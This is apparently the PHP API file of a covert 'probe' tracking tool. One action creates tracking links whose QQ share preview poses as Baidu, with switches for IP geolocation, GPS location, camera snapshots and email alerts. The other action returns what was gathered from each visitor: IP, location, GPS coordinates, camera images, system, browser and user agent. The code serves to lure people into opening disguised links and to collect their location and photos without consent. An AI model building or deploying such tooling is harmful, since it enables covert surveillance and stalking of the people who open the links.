<?php
error_reporting(0);
define('IN_CRONLITE', true);
include_once($_SERVER['DOCUMENT_ROOT']."/include/auxiliary/check_program.php");
check_authorization();

include_once($_SERVER['DOCUMENT_ROOT']."/include/auxiliary/statistics_website.php");
include_once($_SERVER['DOCUMENT_ROOT']."/include/config.php");
include_once($_SERVER['DOCUMENT_ROOT']."/include/db.class.php");
$DB=new DB($dbconfig['host'],$dbconfig['user'],$dbconfig['pwd'],$dbconfig['dbname'],$dbconfig['port']);

statistics_use_api_add();
?>
<?php
$row=$DB->get_row("SELECT * FROM list_function WHERE option_name='api_function' limit 1");
$api_function=$row['option_value'];
if($api_function!=1){
$result = array(
          'code'=>"101",
          'msg'=>"api功能未启用",
        );
exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
}//是否开启api功能
$type=$DB->escape(is_string($_GET['type'] ?? null) ? $_GET['type'] : '');
if($type!="add" and $type!="query"){
	$result = array(
	          'code'=>"102",
	          'msg'=>"类型错误",
	        );
exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
}//类型错误
$key=$DB->escape(is_string($_GET['key'] ?? null) ? $_GET['key'] : '');
if($key==""){
	$result = array(
		          'code'=>"103",
		          'msg'=>"key错误",
		        );
	exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
}
if($type=="add"){
	$page=$DB->escape(is_string($_GET['page'] ?? null) ? $_GET['page'] : '');
	if($page==""){
		$result = array(
					'code'=>"104",
					'msg'=>"page错误",
					);
		exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
	}//页面判断
	$add_ip_location_function=$DB->escape(is_string($_GET['ip_location_function'] ?? null) ? $_GET['ip_location_function'] : '');
	$add_gps_location_function=$DB->escape(is_string($_GET['gps_location_function'] ?? null) ? $_GET['gps_location_function'] : '');
	$add_camera_img_function=$DB->escape(is_string($_GET['camera_img_function'] ?? null) ? $_GET['camera_img_function'] : '');
	$add_email_notification_function=$DB->escape(is_string($_GET['email_notification_function'] ?? null) ? $_GET['email_notification_function'] : '');
	$add_email=$DB->escape(is_string($_GET['email'] ?? null) ? $_GET['email'] : '');
	if($add_email_notification_function=="1" and $add_email==""){
		$result = array(
					'code'=>"104",
					'msg'=>"email错误",
					);
		exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
	}//邮件通知判断
	$row=$DB->get_row("SELECT * FROM list_probe WHERE key_probe='{$key}' limit 1");
	if($row!=''){
			$result = array(
						'code'=>"105",
						'msg'=>"密钥已经存在",
						);
			exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
			}//密钥是否重复
	$DB->query("insert into `list_probe` (`key_probe`,`probe_page`,`ip_location_function`,`gps_location_function`,`camera_img_function`,`email_notification_function`,`email`,`qqshare_title`,`qqshare_pics`,`qqshare_summary`) values
	('$key','$page','$add_ip_location_function','$add_gps_location_function','$add_camera_img_function','$add_email_notification_function','$add_email','百度一下，你就知道','https://www.baidu.com/img/baidu_jgylogo3.gif','百度一下，你就知道')");
    $result = array(
    			'code'=>"200",
    			'msg'=>"http://".$_SERVER['HTTP_HOST']."/probe.php?key=".$key,
    			);
    exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));	
}//探针添加
if($type=="query"){
	$query_result=array();
	$row=$DB->query("select*from list_ip where key_ip='".$key."'");
	while($rows = $DB->fetch($row))
	{
	$query_result_one = array(
				'id'=>$rows['id'],
				'key_ip'=>$rows['key_ip'],
				'ip'=>$rows['ip'],
				'ip_location'=>$rows['ip_location'],
				'ip_lonlat'=>$rows['ip_lonlat'],
				'gps_location'=>$rows['gps_location'],
				'gps_lonlat'=>$rows['gps_lonlat'],
				'camera_img'=>$rows['camera_img'],
				'system'=>$rows['system'],
				'browser'=>$rows['browser'],
				'browser_ua'=>$rows['browser_ua'],
				'browser_language'=>$rows['browser_language'],
				);
	$query_result[]  =$query_result_one;
	}
	$result = array(
				'code'=>"200",
				'msg'=>$query_result,
				);
	exit(json_encode($result,JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE));
}//探针查询
?>